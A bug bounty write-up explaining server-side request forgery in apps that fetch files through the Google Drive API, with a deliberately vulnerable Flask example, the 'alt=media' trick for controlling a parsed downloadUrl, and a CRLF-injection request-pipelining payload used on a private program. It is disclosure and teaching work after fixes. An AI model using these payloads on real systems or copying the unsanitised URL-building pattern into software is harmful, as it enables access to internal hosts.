# Hacking Google Drive Integrations

Have you ever observed Google Drive integrations in your bug bounty targets and wondered what else might be there besides the OAuth CSRF? Is it possible to hack this integration a step further? That's exactly what we'll explore today.

Before we go into the vulnerability, let's take a look at how Google Drive is typically integrated into applications.

There are generally three ways;

- Client side embed.
- Get CDN Url on client side and download on server side.
- Fetch the file on server side via Gdrive API.

The first two are relatively straight forward to test but the last one is where the fun lies.

To understand this, consider a simple application that retrieves and renders a selected image file from Gdrive. I realize this isn't necessary, but I'm attempting to show how things function behind the hood for the purpose of reader's understanding.

Here's the two routes responsible to list and render your google drive image file provided your access token.

```python

#List images from Gdrive

@app.route('/cloud/gdrive/list')
def list_files():
    token = request.args.get('access_token')
    html = ""
    if token:
      r = requests.get('https://www.googleapis.com/drive/v2/files/',headers={'Authorization': 'Bearer '+token})
      resp = json.loads(r.text)
      print(resp)
      for file in resp['items']:
        if file['mimeType'].startswith('image/'):
          html += "<a href='/cloud/gdrive/fetch?file_id="+file['id']+"&access_token="+token+"'>"+file['title']+"</a><br>"    
      return "Select Gdrive image (max 1mb) to fetch <br><br>" + html

    else:
      return "Error"

#Render provided image id from gdrive

@app.route('/cloud/gdrive/fetch')
def fetch_gdrive_video():
    token = request.args.get('access_token')
    file_id = request.args.get('file_id')
    if token and file_id:
      try:
        r = requests.get('https://www.googleapis.com/drive/v2/files/'+file_id,headers={'Authorization': 'Bearer '+token})
        download_url = json.loads(r.text)['downloadUrl']
        d = requests.get(download_url,headers={'Authorization': 'Bearer '+token})
      except Exception as e:
        return Response(str(e), headers={'Content-type':'text/plain'})
      return Response(d.content, headers={'Content-type':'image/png'})
    else: 
      return "Error"

```

![image](https://user-images.githubusercontent.com/21000421/147161950-04263058-f36b-4062-a061-b0b35385e407.png)

The above code should make this easier to understand - We have control in path of the HTTP request made to www.googleapis.com via the file_id. This means we can do a path traversal and add query parameters. At this point you'd want an open redirect on www.googleapis.com to do an SSRF. I didn't find one but I found another cool way. 

To recap this is what's being done on backend;

- Make a request to GDrive API for user's provided file
- Parse the JSON response of Google Drive
- Extract `downloadUrl` key's value from parsed JSON
- Make request to the download url
- Render the response

Simple, however, things will go bad if we control the JSON response to be parsed in 2nd step, as now we control the downloadUrl. There's this magic parameter "alt=media" which would serve the file itself rather than the JSON object and now if the application is relaying on parsing the JSON and extracting "downloadUrl", we have control over it.

 ![image](https://user-images.githubusercontent.com/21000421/147611203-a7fca52f-ad87-4f84-bdbd-97d74ab3e886.png)

Knowing this we can craft a file that on being requested with "alt=media" query param on this application would cause an SSRF attack.

- Create a file call it payload.txt
- Place same File JSON Object into it
- Change the downloadUrl to your URL
- Make a request with `file_id=fildId?alt=media&access_token=abcdef`
- Malicious JSON is parsed and we'll have hit on our own URL from server side. 
- Depending on the application logic this leads to blind/responsive SSRF.

### PoC 

![image](https://user-images.githubusercontent.com/21000421/147612095-d494ef14-70dc-4796-bb29-d74d4cb8dac3.png)


## Case Studies

I've discovered multiple applications vulnerable to this issue in Gdrive integrations due to either lack of sanitization / not using SDK.

Discovery on a private program was by far the finest, but the Dropbox discovery astounded me because I hadn't looked for it there in three years. It's a good reminder that bug bounty collabarotion is important. Thanks Ian.

### Private Program's Partial Read SSRF

This app's Google Drive integration allowed us to import slides from Google, fyi, doc/slides/sheets all are fetched via Drive API generally. 

```
PUT /gdrive/import/ HTTP/2
Host: redacted.com
...

{"fileId":"gdrive_file_id","fileName":"testest","authToken":"gdrive_auth_token","fileType":"slides"}
```

However, this apps's implementation only suffers from path traversal and not adding query params thus preventing the attack. As such, I had to find a way around it. It was then noted that the "authToken" property which adds its value in request headers suffers from a CRLF thus allowing us to control part of request headers/body.

Using this I was able to craft a new request to www.googleapis.com with my controlled query params using [request pipelining](https://stackoverflow.com/questions/19619124/http-pipelining-request-text-example).

Payload would be something like this;

```
PUT /gdrive/import/ HTTP/2
Host: redacted.com
...

{"fileId":"test","fileName":"test","authToken":"x\r\nSSRF:http://rce.ee/aaaaazzzzza\r\nConnection:keep-alive\r\n\r\nGET /drive/v2/files/1XfY_BqdWT-UWM2CNivW1lSR2GhRCizdJ?alt=media HTTP/1.1\r\nHost:www.googleapis.com\r\nAuthorization: Bearer REDACTEDr\n\r\n","fileType":"slides"}
```

Now we could perfrom the alt=media trick, The JSON served is our controlled response on Google drive thus giving us control on the URL. The file fetched first gets parsed as PPT, thus preventing full read access but I suspect the download file is already being stored on CDN regardless of parsing failure. Anyways, to obtain response, we simply redirect to a page which gives a 404 thus getting an exception at Java level which gets thrown in the web app. 

![image](https://user-images.githubusercontent.com/21000421/148796753-ddb57543-596c-4779-99d6-bbe4fd0efaac.png)

Note - the header "SSRF", this is basically read by my server to redirect to internal host.

I wanted to try some pptx related attack but the team was proactive and was monitoring my exploits and already had fixed in production before I woke up next day. Team's response ;)


```
While you were playing with our systems our alerting went batshit, so we were able to react pretty quickly. We deployed quick fix for the issue. Would you be so kind and validate if our quick attempt was successful?
```

### Dropbox's Full Read SSRF

I was informed by [Ian](https://twitter.com/iangcarroll) that Dropbox has Gdrive integrations in both Dropbox and HelloSign. Hellosign's integration was found to be vulnerable with this exploit. I found this bug back in 2019 and its funny I didn't look for this on Dropbox's public program until Ian told me. The bug was pretty simple as such I'm just pointing this section to the report - https://hackerone.com/reports/1406938. This led to a nice bounty of $17,576 through [Dropbox's HackerOne program](https://hackerone.com/dropbox?type=team).

![image](https://user-images.githubusercontent.com/21000421/147614291-8c6cdd59-cd13-4149-ad6d-0183e11b17f6.png)


This is a problem that affects a variety of applications. I also wanted to emphasize why it's critical to understand how things work behind the scenes. It's crucial to consider anything and think what might happen on the backend. In 2019, I looked at one of Vimeo's programs and wondered how they would get the gdrive file, making an API request? Isn't it a path traversal if it's a REST API with my input in the URL? If that's the case, there's a small chance of an SSRF with an open redirect on Google APIs and here we are.

That's all. Thanks for reading! If you enjoyed this and other articles in this repo please consider retweeting and following [HTTPVoid on Twitter](https://twitter.com/httpvoid0x2f).

Author;

Harsh, HTTPVoid
